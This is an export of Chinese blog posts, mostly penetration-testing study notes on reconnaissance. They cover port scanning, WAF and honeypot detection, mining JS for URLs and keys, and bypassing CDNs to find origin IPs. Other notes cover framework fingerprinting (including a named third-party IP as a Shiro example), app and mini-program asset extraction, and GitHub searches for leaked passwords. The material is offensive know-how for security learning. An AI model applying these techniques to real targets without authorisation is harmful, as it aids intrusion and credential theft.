[{"title":"(eval)1 _python-argcomplete function definition file not found","url":"/2025/09/16/(eval)1%20_python-argcomplete%20function%20definition%20file%20not%20found/","content":"(eval):1: _python-argcomplete: function definition file not found我在使用kali的时候每次想使用table键补全命令就会报错，很烦人就是\n去网上搜了一下，终于找到了解决方法\n\nargcomplete是一个用于Python的命令行参数自动补全工具。它通过与argparse库结合，为Python应用程序提供强大的命令行参数和选项的自动补全功能。argcomplete支持bash和zsh两种主流的shell环境，使得用户在输入命令时可以通过按Tab键快速补全参数和选项，极大地提高了命令行操作的效率\n\n\n检查python环境首先，确保你的系统中已经安装了Python 3.x版本。可以通过命令python3 --version来检查。\n\n使用pip安装：使用pip命令来安装argcomplete。打开终端并输入以下命令：\nsudo apt install python3-argcomplete\n\n安装完成后使用命令pip show argcomplete来确认安装是否成功\n\n激活全局补全功能在安装argcomplete后，打开终端输入命令\nactivate-global-python-argcomplete\n\n​\t5. 激活完成后要关闭当前终端然后再开启一个新的终端就好了\n","categories":["疑难杂症"],"tags":["故障排查","已解决","问题与复盘","学习问题"]},{"title":"015-信息打点-端口扫描&WAF&蜜罐识别项目等","url":"/2025/09/16/015-%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F&WAF&%E8%9C%9C%E7%BD%90%E8%AF%86%E5%88%AB%E9%A1%B9%E7%9B%AE%E7%AD%89/","content":"015-信息打点-端口扫描&amp;WAF&amp;蜜罐识别项目等\n本节内容\n\n1、端口扫描-应用&amp;协议2、WAF识别-分类&amp;识别3、蜜罐识别-分类&amp;识别解决：1、Web服务器&amp;应用服务器差异性2、WAF防火墙&amp;安全防护&amp;识别技术3、蜜罐平台&amp;安全防护&amp;识别技术\n\n一.端口扫描-应用&amp;协议\nNmap：配置中：Quick scan plus是快速扫描，intense scan all TCP ports 是全部端口扫描\n\n\n\n端口扫描的意义：通过扫描端口是否开放来确定主机上面安装过什么应用，网站应用数据库应用 等….\n在进行端口扫描的时候应该考虑 ：1.防火墙 2.内网环境\n防火墙：对端口进行过滤 但不代表端口没有开启 只是没有对外服务\n内网环境可能出现的情况：明明数据库端口是开的,网站也能正常打开 但是你对目标进行端口扫描 发现数据库端口没有开放（排除防火墙问题）\n二.WAF防火墙&amp;安全防护&amp;识别技术1、WAF解释：Web应用防护系统（也称为：网站应用级入侵防御系统。英文：Web Application Firewall，简称：WAF）。利用国际上公认的一种说法：Web应用防火墙是通过执行一系列针对HTTP&#x2F;HTTPS的安全策略来专门为Web应用提供保护的一款产品\n2、WAF分类：\n云WAF：百度安全宝、阿里云盾、长亭雷池，华为云，亚马逊云等（中大型企业）硬件WAF：绿盟、安恒、深信服、知道创宇等公司商业产品（政府，学习，军工）软件WAF：宝塔，安全狗、D盾等（个人）代码级WAF：自己写的waf规则，防止出现注入等，一般是在代码里面写死的\n\n3、识别看图：拦截页面，identywaf项目内置\n4、识别项目：https://github.com/EnableSecurity/wafw00f\n\nidentywaf\nhttps://github.com/stamparm/identYwaf\n\n使用语法：python identYwaf.py https://jmhewang.com/\n\n\n#识别-蜜罐平台-人工&amp;网络空间&amp;项目1.蜜罐解释：蜜罐是一种安全威胁的检测技术，其本质在于引诱和欺骗攻击者，并且通过记录攻击者的攻击日志来产生价值。安全研究人员可以通过分析蜜罐的被攻击记录推测攻击者的意图和手段等信息。攻击方可以通过蜜罐识别技术来发现和规避蜜罐。因此，我们有必要站在红队攻击者的角度钻研蜜罐识别的方式方法。\n2.蜜罐分类：根据蜜罐与攻击者之间进行的交互的程度可以将蜜罐分为三类:低交互蜜罐、中交互蜜罐、高交互蜜罐。当然还可以根据蜜罐模拟的目标进行分类，比如：数据库蜜罐、工控蜜罐、物联网蜜罐、Web蜜罐等等。\n3.蜜罐识别1.项目识别https://github.com/graynjo/Heimdallr\n\n\n如果指纹探测 和警告有提示的话基本上蜜罐 但是此插件的准确率有待考证\nhttps://github.com/360quake/quake_rs\n安装：解压后在目录下cmd启用quake.exequake.exe init apikey值（api值需要注册360网络空间获取360网络空间测绘 — 因为看见，所以安全使用语法：quake.exe honeypot 目标\n2.人工识别\n端口多而有规律性\nWeb访问协议就下载\n\n\n\n设备指纹分析\n网络空间识别\n鹰图 Quake \n\n\n\n\n","categories":["小迪学习笔记"],"tags":["渗透测试","Web安全","网络安全"]},{"title":"014-信息打点-JS架构&框架识别&泄漏提取&API接口枚举&FUZZ爬虫&插件项目","url":"/2025/09/16/014-%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9-JS%E6%9E%B6%E6%9E%84&%E6%A1%86%E6%9E%B6%E8%AF%86%E5%88%AB&%E6%B3%84%E6%BC%8F%E6%8F%90%E5%8F%96&API%E6%8E%A5%E5%8F%A3%E6%9E%9A%E4%B8%BE&FUZZ%E7%88%AC%E8%99%AB&%E6%8F%92%E4%BB%B6%E9%A1%B9%E7%9B%AE/","content":"第14天：信息打点-JS架构&amp;框架识别&amp;泄漏提取&amp;API接口枚举&amp;FUZZ爬虫&amp;插件项目一.本节知识点1、JS前端架构-识别&amp;分析2、JS前端架构-开发框架分析3、JS前端架构-打包器分析4、JS前端架构-提取&amp;FUZZ解决：1、如何从表现中的JS提取价值信息2、如何从地址中FUZZ提取未知的JS文件3、如何从JS开放框架WebPack进行测试\n1.什么是cms\nCMS（意思为“网站内容管理系统”， 用来管理网站后台，编辑网站前台。）Discuz、WordPress、Ecshop、蝉知等前端技术；HTML5、jquery、bootstrap、Vue等开发语言；PHP、JAVA、Ruby、Python、C#，JS等Web服务器；Apache、Nginx、IIS、lighttpd，Apache等应用服务器：；Tomcat、Jboss、Weblogic、Websphere等数据库类型：；Mysql、SqlServer、Oracle、Redis、MongoDB等操作系统信息；Linux、windows等应用服务信息：；FTP、SSH、RDP、SMB、SMTP、LDAP、Rsync等CDN信息；帝联、Cloudflare、网宿、七牛云、阿里云等WAF信息；创宇盾、宝塔、ModSecurity、玄武盾、OpenRASP等。蜜罐信息：；HFish、TeaPot、T-Pot、Glastopf等其他组件信息；fastjson、shiro、log4j、OA办公等\n\n2. 什么是js渗透测试在Javascript中也存在变量和函数，当存在可控变量及函数调用即可参数漏洞JS开发的WEB应用和PHP，JAVA,NET等区别在于即没有源代码，也可以通过浏览器的查看源代码获取真实的点。获取URL，获取JS敏感信息，获取代码传参等，所以相当于JS开发的WEB应用属于白盒测试（默认有源码参考），一般会在JS中寻找更多的URL地址，在JS代码逻辑（**加密算法，APIkey配置，验证逻辑等）**进行后期安全测试\n\n前提：Web应用可以采用后端或前端语言开发后端语言：php java python .NET 浏览器端看不到真实的源代码前端语言：JavaScript(JS)和JS框架 浏览器端看到真实的源代码例子：zblog：核心功能采用PHP语言去传输接受\n\n3.js安全问题\n\n源码泄漏\n未授权访问&#x3D;JS里面分析更多的URL访问确定接口路径\n敏感key泄漏&#x3D;JS文件中可能配置了接口信息（云应用，短信，邮件，数据库等）\nAPI接口安全&#x3D;（代码中加密提交参数传递，更多的URL路径）\n\n\n4.流行的Js框架有那些？\n\n大型企业应用：Angular或React + Next.js\n快速原型开发：Vue.js或Svelte\n高性能要求：Solid.js&#x2F;Qwik\n全栈开发：Next.js&#x2F;Nuxt.js\n\n\n5.如何判断js开发应用\n\n插件wappalyzer\n源程序代码简短\n引入多个js文件\n一般有&#x2F;static&#x2F;js&#x2F;app.js等顺序的js文件\n一般cookie中有connect.sid\n\n\n6.如何获取更多的JS文件？\n\n手工-浏览器搜索 分析时间长，但是精准\n\n半自动-Burpsuite插件 居中\n\n工具化-各类提取&amp;FUZZ项目 分析时间短，精准度低\n\n\n\n7.快速获取价值信息——JS代码中常见的重要标签和函数\nsrc&#x3D;\t\t\t\t\t\t\t——链接地址path&#x3D;\t\t\t\t\t\t    ——路径\t\tmethod:”get”\t\t\t\t    ——请求方法http.get(“method:”post”http.post(“$.ajaxhttp://service.httpposhttp://service.httpget\n以上搜索都是为了寻找链接地址和路径，目的就是为了得到URL上的其他访问，就可以尝试去访问这些地址来看是什么东西，有没有对渗透是有帮助的\n\n\n二.JS 前端架构-打包器分析1..前端架构-手工搜索分析浏览器全局搜索分析 \n2.前端架构-半自动Burp分析\n自带功能：Target-&gt;sitemap-&gt;Engagement tools-&gt;Find scripts\n官方插件：JS Link Finder &amp; JS Miner\n第三方插件：HaE &amp; Unexpected_information\n插件加载器：jython-standalone-2.7.2\n\n3.插件工具 \n1.Unexpected_information：https://github.com/ScriptKid-Beta/Unexpected_information\n用来标记请求包中的一些敏感信息、JS接口和一些特殊字段，\n防止我们疏忽了一些数据包，使用它可能会有意外的收获信息。\n2.HaE：https://github.com/gh0stkey/HaE\nhttps://raw.githubusercontent.com/gh0stkey/HaE/gh-pages/Config.yml\n基于BurpSuite插件JavaAPI开发的请求高亮标记与信息提取的辅助型插件。该插件可以通过自定义正则的方式匹配响应报文或请求报文，可以自行决定符合该自定义正则匹配的相应请求是否需要高亮标记、信息提取。\n3.前端架构-自动化项目分析1.URLFinder URLFinder从表现中JS中提取URL或者敏感数据https://github.com/pingc0y/URLFinder一款用于快速提取检测页面中JS与URL的工具。功能类似于JSFinder，但JSFinder好久没更新了。2.JSINFO-SCAN从表现中JS中提取URL或者敏感数据https://github.com/p1g3/JSINFO-SCAN递归爬取域名(netloc&#x2F;domain)，以及递归从JS中获取信息的工具3.FindSomething从表现中JS中提取URL或者敏感数据https://github.com/momosecurity/FindSomething该工具是用于快速在网页的html源码或js代码中提取一些有趣的信息的浏览器插件，包括请求的资源、接口的url，请求的ip和域名，泄漏的证件号、手机号、邮箱等信息。4.Packer-Fuzzer针对JS框架开发打包器Webpack检测https://github.com/rtcatc/Packer-Fuzzer一款针对Webpack等前端打包工具所构造的网站进行快速、高效安全检测的扫描工具，只能检测webpack\n","categories":["小迪学习笔记"],"tags":["渗透测试","Web安全","网络安全"]},{"title":"016-信息打点-CDN绕过&资源URL&工具项目等","url":"/2025/09/16/016-%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9-CDN%E7%BB%95%E8%BF%87&%E8%B5%84%E6%BA%90URL&%E5%B7%A5%E5%85%B7%E9%A1%B9%E7%9B%AE%E7%AD%89/","content":"016-信息打点-CDN绕过&amp;资源URL&amp;工具项目等\n一.相关链接&amp;工具站&amp;项目工具超级Ping：http://www.17ce.com/\n超级Ping：https://ping.chinaz.com/\n接口查询：https://get-site-ip.com/\n接口查询：https://fofa.info/extensions/source\n国外请求：https://tools.ipip.net/cdn.php\n国外请求：https://boce.aliyun.com/detect/\nIP社区库：https://www.cz88.net/geo-public\n全网扫描：https://github.com/Tai7sy/fuckcdn\n全网扫描：https://github.com/boy-hack/w8fuckcdn\n全网扫描：https://github.com/Pluto-123/Bypass_cdn\n大佬文章-CDN绕过\nhttps://mp.weixin.qq.com/s/zxEH-HMqKukmq7qXfrdnQQ\n二.CND前置知识：1.传统访问：用户访问域名–&gt;解析服务器IP–&gt;访问目标主机\n2.普通CDN：用户访问域名–&gt;CDN节点–&gt;真实服务器IP–&gt;访问目标主机\n3.带WAF的CDN：用户访问域名–&gt;CDN节点（WAF）–&gt;真实服务器IP–&gt;访问目标主机\n\nCDN:的作用 使针对主机IP地址的信息搜集失效\n\n三.CDN厂商：**国内：**阿里云、百度云、七牛云、又拍云、腾讯云、Ucloud、360、网宿科技、ChinaCache\n国外服务商\n**国外：**CloudFlare、StackPath、Fastly、Akamai、CloudFront、Edgecast、CDNetworks、Google、Cloud CDN\n、CacheFly、Keycdn、Udomain、CDN77\n四.CDN配置方法由三种业务功能，对应三种方法去寻找真实IP，三种技术方法\n配置1：加速域名-需要启用加速的域名子域名获取真实IP\n和加速配置有关，配置为全部子域名则方法失效\n获取到真实IP也不一定对，因为子域名和主站不一定是同一地址\n对比网站备案号和IP归属地，判定网站真实IP大概率为以上。不能说一定是，也有可能是负载均衡。这种情况先将该IP当作真实IP测试，信息越来越多的时候最终可能确定真实IP。\n配置2：加速区域-需要启用加速的地区国外访问获取\n基于加速区域没有选择全球，则找一些冷门，国外的地方访问，测试是否有CDN服务\n配置3：加速类型-需要启用加速的资源证书\n五.如何进行CDN识别超级Ping：http://17ce.com/\n超级Ping：https://ping.chinaz.com/\n各地ping（出现多个IP即启用CDN服务）\n后置：绑定HOST访问解析（参考基础课CDN安全影响）\n\n找到真实IP后，在本地host文件中将域名强制指向真实IP\n\n六.如何绕过CDN子域名，邮件系统，国外访问，证书查询，APP抓包，网络空间\n通过漏洞或泄露获取，扫全网，以量打量，第三方接口查询等\n1.子域名绕过配置加速选项中只加速主域名，导致其他子域名未加速（解析IP可能同IP也可能C段）\n接口查询：https://get-site-ip.com/\n接口查询：https://fofa.info/extensions/source\n使用网络空间&amp;第三方功能集合查询判断\n2.主动漏洞&amp;遗留文件1、漏洞如：SSRF RCE等利用漏洞让对方真实服务器主动出网连接，判断来源IP即真实IP\n\n网站的主动行为，让网站（服务器）访问外网，如引用资源图片远程加载，访问外部。\n在自己服务器搭建一个地址，让对方访问，监听\n记录下IP地址\n\n2、遗留文件：phpinfo类似功能通过访问类似PHPINFO类似代码函数获取本地IP造成的地址泄漏\n3.邮件系统绕过通过邮件系统绕过CDN是很容易的，成因：\n1、邮件系统不能设置CDN\n2、属于主动类型，对方给自己发邮件\n\n发信人必须是由域名当邮件用户名\n\n让他主动给你发：部署架设的邮件服务器如果向外部用户发送邮件的话，\n那么邮件头部的源码中会包含此邮件服务器的真实IP地址。（此时，邮件系统和网站系统在搭建在同一服务器的话即获取到真实IP）\n常见的邮件触发点有：\n1、RSS订阅\n2、邮箱注册、激活处\n3、邮箱找回密码处\n4、产品更新的邮件推送\n5、某业务执行后发送的邮件通知\n6、员工邮箱、邮件管理平台等入口处的忘记密码\n\n有些网站是来自域名的IP发送的邮件，有些不行（看发件人）\n\n你给未知邮箱发：（需要自己的邮件服务器不能第三方）\n通过发送邮件给一个不存在的邮箱地址，因为该用户邮箱不存在，所以发送将失败，\n并且还会收到一个包含发送该电子邮件给你的服务器的真实IP通知。\n\n若使用的第三方邮件服务（QQ邮箱、网易邮箱等）则不能收到真实IP，因为邮件退回到三方系统，则收到的是使用的三方服务的地址。\n自己搭建邮件系统，才能根据退回的邮件找到IP\n\n4.接口查询绕过接口工具站中输入IP直接会帮助查找（有时候也会查错，作为参考\n接口查询：https://get-site-ip.com/\n网络空间FOFA增值服务\n接口查询：https://fofa.info/extensions/sou\n\nfofa接口针对国外，国内会有一定的法律风险\n\n5.CDN绕过-全网扫描1、判断加速厂商\n2、IP库筛地址段\n3、配置范围扫描\n先从IP段去扫描符合开放端口，再从IP去访问查找关键字，将符合结果进行保存！\n工具项目（IP库：\nIP库很多都收费，以下是免费社区版，但是肯定信息不全\n纯真IP库，用的最多的\nhttps://www.cz88.net/geo-public\nfuckcdn-以IP访问关键字筛选\nhttps://github.com/Tai7sy/fuckcdn\nbypasscdn-用子域名技术跑真实IP，域名访问筛选关键字（IP不支持访问时使用\n全网扫描的方法也有限制，因为是通过IP扫描，所以如果对方限制IP访问，则无法成功IP反查域名，使用工具站\n总结综合各种方法&amp;接口来判断，如果都一样，一般就判定真实IP，不一样，可以综合网站备案地区，IP地址信息等信息判定最有可能的真实IP（一般腾讯云，阿里云等可信度更高，没有显示厂商就先放一放，因为一般使用CDN都会优先选用一些大厂产品\nCDN对网站有保护作用，防DDOS。转移流量\n","categories":["小迪学习笔记"],"tags":["渗透测试","Web安全","网络安全"]},{"title":"017-信息打点-框架组件&CMS工具&其他等","url":"/2025/09/16/017-%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9-%E6%A1%86%E6%9E%B6%E7%BB%84%E4%BB%B6&CMS%E5%B7%A5%E5%85%B7&%E5%85%B6%E4%BB%96%E7%AD%89/","content":"017-信息打点-框架组件&amp;CMS工具&amp;其他等\n本节课主要知识点\n1.CMS识别到后期漏洞利用和代码审计2.开发框架识别到后期漏洞利用和代码审计3.开发组件识别到后期漏洞利用和代码审计\n一、CMS指纹识别-不出网程序识别1.概念CMS指纹识别一般能识别到的都是以PHP语言开发的网页为主，其他语言开发的网页识别难度大\n识别的意义就是向着对应目标使用对应的工具进行攻击\n1.后端：CMS：一般PHP开发居多源码程序（利用源码程序名去搜漏洞情况，源码去下载进行后期的代码审计）\n2.前端：JS框架（爬取更多的JS从里面筛选URL或敏感泄漏KEY等） \n也是可以通过对JS代码逻辑进行代码审计\n3.组件：\n组件：第三方的功能模块（日志记录，数据监控，数据转换等）\n\njava居多，常见有过安全漏洞组件（shiro solr log4j sprintboot等）\n4.框架：\n框架：简单代码的一个整合库，如果使用框架就只需要学习使用框架调用即可\n如：文件上传功能是需要很多代码来实现的，框架把这个代码进行封封装，调用即可\n影响：如果采用框架开发，代码的安全性是取决于框架的过滤机制\n\nphp java python都有相对应的漏洞\t\n二.web架构 1. 最简单最入门的开发模型（功能代码全部手写）最容易出现漏洞，程序员水平不一，没有第三方或团队的检测，单纯的自己写\n2.结合开发框架的开发模型（以框架为核心实现功能）第三方或团队的开发的封装代码框架，一般内置的过滤机制（框架漏洞）\n3.结合开发框架外加组件模型（以框架为核心，组件为辅实现功能）第三方或团队的开发的封装代码框架，一般内置的过滤机制（框架和组件漏洞）\n利用：CMS识别到后期漏洞利用和代码审计\n三.指纹识别-本地工具-GotoScan（内网）https://github.com/newbe3three/gotoscan\n\n四.Python-开发框架-Django&amp;Flask1.DjangoSet-Cookie:expires&#x3D;或者Set-Cookie: csrftoken&#x3D;\n\n插件识别\n\n简单来说都是通过web的一些返回包或者框架的插件就识别包括其他信息来确定是个什么情况\n2.flask1、识别插件2、Set-Cookie:expires&#x3D;或者Etag：\n\nPHP-开发框架-ThinkPHP&amp;Laravel&amp;Yii1.ThinkPHP：1、识别插件2、X-Powered-By: ThinkPHP或者直接识别ThinkPHP官方图标3、CMS识别到源码体系TP开发\n\nLaravel：1、识别插件2、Set-Cookie: laravel_session&#x3D;或者Set-Cookie: XSRF-TOKEN\n\n\n\nYii:1、识别插件2、Set-Cookie：YII_CSRF_TOKEN\n\n\n六.Java-框架组件-Fastjson&amp;Shiro&amp;Solr&amp;Spring52类110个主流Java组件和框架介绍：https://blog.csdn.net/agonie201218/article/details/125300729\nFastjson&#x2F;Jackson\n在提交JSON数据包中修改测试：Fastjson组件会把01解析成1Jackson组件在解析01时会抛出异常 https://forum.butian.net/share/1679\n\n\n理想状态下如果站点有原始报错回显，可以用不闭合花括号的方式进行报错回显，报错中往往中会有Fastjson&#x2F;Jackson的关键字：\n\n\n但是实际上并不可能那么的理想，所以需要一些其他的trick来进行区分。下面探讨下两个解析器之间有什么区别。\nFastjson会把01解析成1:\n\nJackson在解析01时会抛出异常\n\nShiro\n\n请求包的cookie中存在rememberMe字段。返回包中存在set-Cookie：remeberMe&#x3D;deleteMe。请求包中存在rememberMe&#x3D;x时，响应包中存在rememberMe&#x3D;deleteMe。有时候服务器不会主动返回remeberMe&#x3D;deleteMe，直接发包即可，将Cookie内容改为remember Me&#x3D;1，若相应包有rememberMe&#x3D;deleteMe，则基本可以确定网站apache shiro搭建的。网址http://58.63.71.214:9091/login###\n\n\nStruts2一般使用struts2框架后缀带do或action，可以尝试进行利用\n\nSpringboot1、通过web应用程序网页标签的小绿叶图标2、通过springboot框架默认报错页面\n\nSolr识别一般开放8983端口,访问页面也可以探针到\n\n","categories":["小迪学习笔记"],"tags":["渗透测试","Web安全","网络安全"]},{"title":"018-信息打点-APP资产&知识产权&应用监控&静态提取&动态抓包&动态调试","url":"/2025/09/16/018-%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9-APP%E8%B5%84%E4%BA%A7&%E7%9F%A5%E8%AF%86%E4%BA%A7%E6%9D%83&%E5%BA%94%E7%94%A8%E7%9B%91%E6%8E%A7&%E9%9D%99%E6%80%81%E6%8F%90%E5%8F%96&%E5%8A%A8%E6%80%81%E6%8A%93%E5%8C%85&%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/","content":"第18天：信息打点-APP资产&amp;知识产权&amp;应用监控&amp;静态提取&amp;动态抓包&amp;动态调试\n本节内容\n1、Web&amp;备案信息&amp;单位名称中发现APP2、APP资产静态提取&amp;动态抓包&amp;动态调试解决：1、如何获取到目标APP信息2、如何从APP信息中提取资产\n\n一、如何获取到目标APP信息1.名称获取app信息(爱企查、小蓝本、七麦、点点)1.爱企查知识产权https://aiqicha.baidu.com/\n\n2.七麦、点点查名称[七麦\n\n点点查\n2、URL网站备案查APP关于我们 (psbc-ubank.com)（中邮邮惠万家）\n\n1、查备案信息在搜\n2、网站上有APP下载\n3、市场直接搜单位名称\n\n\n二、如何从app中收集资产通过获取App配置、数据包，去获取url、api、osskey、js等敏感信息。\n\n\n资产信息-IP 域名 网站 -转到对应Web测试 接口测试 服务测试\n泄露信息-配置key 资源文件 - key（osskey利用，邮件配置等）\n代码信息-java代码安全问题- 逆向相关\n\n\n1、抓包-动态表现优点：没有误报缺点：无法做到完整\n2、提取-静态表现&amp;动态调试优点：数据较为完整缺点：有很多无用的资产\n3、搜索-静态表现优点：没有误报，解决不能抓包不能代理等情况优点；搞逆向的人能看到实时的app调用链等缺点：无法做到完整\n南明离火网站\n\n","categories":["小迪学习笔记"],"tags":["渗透测试","Web安全","网络安全"]},{"title":"019-信息打点-小程序组手&开发工具&依赖等","url":"/2025/09/16/019-%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9-%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%BB%84%E6%89%8B&%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7&%E4%BE%9D%E8%B5%96%E7%AD%89/","content":"019-信息打点-小程序组手&amp;开发工具&amp;依赖等知识点\n1、Web&amp;备案信息&amp;单位名称中发现小程序2、小程序资产静态提取&amp;动态抓包&amp;动态调试解决：1、如何获取到目标小程序信息2、如何从小程序中提取资产信息\n\n一.➢小程序获取-各大平台&amp;关键字搜索微信百度支付宝抖音头条\n\n二.小程序主题结构1.主体结构小程序包含一个描述整体程序的 app 和多个描述各自页面的 page。一个小程序主体部分(即app)由三个文件组成，必须放在项目的根目录，如下：\n\n\n\n文件\n必需\n作用\n\n\n\napp.js\n是\n小程序逻辑\n\n\napp.json\n是\n小程序公共配置\n\n\napp.wxss\n否\n小程序公共样式表\n\n\n2.一个小程序页面由四个文件组成，分别是:\n\n\nxxx.js\n页面逻辑\n\n\n\nxxx.json\n页面配置\n\n\nxxx.wxml\n页面结构\n\n\nxxx.wxss\n页面样式\n\n\n3.项目整体目录结构\n\n\npages\n页面文件夹\n\n\n\nindex\n首页\n\n\nlogs\n日志\n\n\nutils util\n工具类(mina框架自动生成,你也可以建立一个：api)\n\n\napp.js\n入口js(类似于java类中的main方法)、全局js\n\n\napp.json\n全局配置文件\n\n\napp.wxss\n全局样式文件\n\n\nproject.config.json\n跟你在详情中勾选的配置一样\n\n\nsitemap.json\n用来配置小程序及其页面是否允许被微信索引\n\n\n\n\n\n\n\n三.小程序抓包-Proxifier&amp;BurpSuite联动对抓到的IP或域名进行Web安全测试对抓到的IP或域名进行API安全测试对抓到的IP或域名进行端口服务测试\n\n问题：微信崩溃小程序打开没网\n原因：代理规则没有设置对wechat*.exe将微信所有的进程全部获取，导致崩溃\n解决：修改代理规则为：WeChatAppEx.exe，只专注于小程序的进程进行转发即可\n\n\n四.小程序逆向-解包反编译&amp;动态调试&amp;架构\n对源码架构进行分析更多的资产信息敏感的配置信息未授权访问测试源码中的安全问题\n\n小程序多功能组手复杂操作：https://www.cnblogs.com/oodcloud/p/16964878.html简单工具：http://xcx.siqingw.top/-微信官方开发工具https://developers.weixin.qq.com/miniprogram/dev/devtools/stable.html\n首先下载小程序助手和微信小程序官方开发工具 微信设置→文件管理→即可找到目录\n微信小程序的缓存包在Applet下\n\n","categories":["小迪学习笔记"],"tags":["渗透测试","Web安全","网络安全"]},{"title":"020-信息打点-红蓝队优秀工具项目集合","url":"/2025/09/16/020-%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9-%E7%BA%A2%E8%93%9D%E9%98%9F%E4%BC%98%E7%A7%80%E5%B7%A5%E5%85%B7%E9%A1%B9%E7%9B%AE%E9%9B%86%E5%90%88/","content":"020-信息打点-红蓝队优秀工具项目集合\n本节知识点\n\n1、工具项目-红蓝队&amp;自动化部署2、工具项目-自动化侦查收集提取3、工具项目-综合&amp;网络空间&amp;信息\n#各类红蓝队优秀工具项目集合：https://github.com/guchangan1/All-Defense-Tool本项目集成了全网优秀的开源攻防武器项目，包含信息收集工具（自动化利用工具、资产发现工具、目录扫描工具、子域名收集工具、指纹识别工具、端口扫描工具、各种插件…），漏洞利用工具（各大CMS利用工具、中间件利用工具等项目…），内网渗透工具（隧道代理、密码提取…）、应急响应工具、甲方运维工具、等其他安全攻防资料整理，供攻防双方使用。如果你有更好的建议，欢迎提出请求。\n\n一.自动化-武器库部署-F8x1.介绍\n一款红&#x2F;蓝队环境自动化部署工具,支持多种场景,渗透,开发,代理环境,服务可选项等.\n2、配置：\n\n项目地址：https://github.com/ffffffff0x/f8x 详情参考这个\n通过 CF Workers 下载 [推荐]wget : wget -O f8x https://f8x.io/curl : curl -o f8x https://f8x.io/\n\n下载\nwget : wget -O f8x https://f8x.io/\ncurl : curl -o f8x https://f8x.io/\n\n\n使用**：**bash f8x -h\n\n\n安装mobsf\n\nbash f8x -mobsf\n\n\n再次启动直接输入，以下指令即可\ndocker run -it --rm -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest\n打开网址http://ip地址:8000/ 即可\n\n\n\n二.自动化-企查信息-AsamF项目地址：https://github.com/Kento-Sec/AsamF\n1、介绍：\nAsamF集成了Fofa、Hunter、Quake、Zoomeye、Shodan、爱企查、Chinaz、0.zone、subfinder。AsamF支持Fofa、Hunter、Quake、Zoomeye、Shodan、Chinaz、0.zone配置多个Key。\n\n\n2、配置：\nAsamF会在&#x2F;.config&#x2F;asamf&#x2F;目录下生成config.json文件。如果你有多个key，按照json的格式录入即可，建议键值按照阿拉伯数字依次录入,方便以阿拉伯数字来切换key。自动结果保存在&#x2F;asamf&#x2F;目录下。\n\n\n\n解压到相关目录下，并使用cmd输入语句：AsamF_windows_amd64.exe -vC:\\Users\\用户名.config\\asamf 打开目标文件下进行配置config.json使用相关语句，一键查询导出AsamF_windows_amd64.exe q -q weblogic\n\n对fofa、hunter、zoomeye、quake的部分语法进行了整合，部分选项可以聚合各个平台一并搜索。\n导出数据在各大平台是要付一定积分换取的，但通过工具可以直接导出\n\n\n三.自动化-企查信息-ENScan项目地址：https://github.com/wgpsec/ENScan_GO\n1、介绍：剑指HW&#x2F;SRC，解决在HW&#x2F;SRC场景下遇到的各种针对国内企业信息收集难题\n2、配置：ENScanGo在第一次使用时需要使用**-v命令生成配置文件**信息后进行配置\n解压到相关目录下，并使用cmd输入语句：enscan-0.0.16-windows-amd64.exe -v在解压文件的目标文件下会生成配置文件进行配置config.json输入enscan-0.0.16-windows-amd64.exe -n，等待即可导出的数据自动保存在目录下\n\n\n四.自动化-综合架构-ARL&amp;Nemo1.ARL灯塔项目地址：https://github.com/TophantTechnology/ARL\n1、介绍：旨在快速侦察与目标关联的互联网资产，构建基础资产信息库。 协助甲方安全团队或者渗透测试人员有效侦察和检索资产，发现存在的薄弱点和攻击面。\n2、配置：（docker搭建）Docker 环境安装ARL1. docker 依赖安装\nUbuntu 下可以直接执行 apt-get install docker.io docker-compose -y 安装相关依赖。\n2.ARL安装和启动\ncd /opt/mkdir docker_arlwget -O docker_arl/docker.zip https://hub.fastgit.org/TophantTechnology/ARL/releases/download/v2.6/docker.zipcd docker_arlunzip -o docker.zipdocker-compose pulldocker volume create arl_dbdocker-compose up -d\n\n\n\n\n\n\n\n\n\n\n\n2.Nemo_Go项目地址：https://github.com/hanc00l/nemo_go\n1、介绍：Nemo是用来进行自动化信息收集的一个简单平台，通过集成常用的信息收集工具和技术，实现对内网及互联网资产信息的自动收集，提高隐患排查和渗透测试的工作效率，用Golang完全重构了原Python版本。\n2、配置：（docker搭建）https://github.com/hanc00l/nemo_go/blob/main/docs/docker.md\n\nmkdir nemo;\ntar xvf nemo_linux_amd64.tar -C nemo;cd nemo \ndocker-compose up -d\n\n","categories":["小迪学习笔记"],"tags":["渗透测试","Web安全","网络安全"]},{"title":"021-信息打点-wangpan&Github项目&实战文档等","url":"/2025/09/16/021-%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9-wangpan&Github%E9%A1%B9%E7%9B%AE&%E5%AE%9E%E6%88%98%E6%96%87%E6%A1%A3%E7%AD%89/","content":"021-信息打点-wangpan&amp;Github项目&amp;实战文档等 \n知识点1、开发泄漏-Github监控2、文件泄漏-网盘全局搜索3、架构泄漏-目录扫码&amp;爬虫4、其他泄漏-公众号服务资产4、收集进阶-证书&amp;图标&amp;邮箱\n**➢微信公众号-获取&amp;三方服务1、获取微信公众号途径https://weixin.sogou.com/\n\n\n\n\n\n\n2、微信公众号有无第三方服务（除去腾讯微信提供的官方api）➢Github监控-开发&amp;配置&amp;源码目标中开发人员或者托管公司上传的项目存在源码泄漏或配置信息（密码密匙等），人员数据库等敏感信息，找到多个脆弱点。\n1、人员&amp;域名&amp;邮箱等筛eg：xxx.cn password in:filehttps://gitee.com/\nhttps://github.com/\nhttps://www.huzhan.com/\n\n\n\nin:name test\n#仓库标题搜索含有关键字\n\n\n\nin:descripton test\n\n\n\n\nGITHUB资源搜索：in:name test #仓库标题搜索含有关键字 #仓库描述搜索含有关键字in:readme test #Readme文件搜素含有关键字stars:&gt;3000 test #stars数量大于3000的搜索关键字stars:1000…3000 test #stars数量大于1000小于3000的搜索关键字 forks:&gt;1000 test #forks数量大于1000的搜索关键字forks:1000…3000 test #forks数量大于1000小于3000的搜索关键字 size:&gt;&#x3D;5000 test #指定仓库大于5000k(5M)的搜索关键字 